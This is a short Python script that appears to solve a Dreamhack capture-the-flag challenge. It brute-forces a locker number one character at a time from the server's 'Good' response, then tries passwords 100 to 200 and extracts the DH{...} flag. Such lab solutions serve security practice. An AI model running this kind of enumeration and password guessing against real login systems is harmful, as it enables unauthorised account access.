import requests
import re
import string

url = "http://host3.dreamhack.games:21700/"


characters = string.ascii_lowercase + string.digits
char_list = list(characters)

id = ""

for i in range(4):
    for i in char_list:

        data = {
            "locker_num":id+i,
            "password":"test"
        }

        response = requests.post(url, data=data)
        print(i)
        if "Good" in response.text:
            id += i
            break

print(id)
pattern = r'DH\{.*?\}'

for i in range(100,201):
    data = {
        "locker_num":id,
        "password":i
    }

    response = requests.post(url, data=data)
    print(i)
    if "FLAG" in response.text:
        matches = re.findall(pattern, response.text)
        for match in matches:
            print(f'Flag: {match}')
        break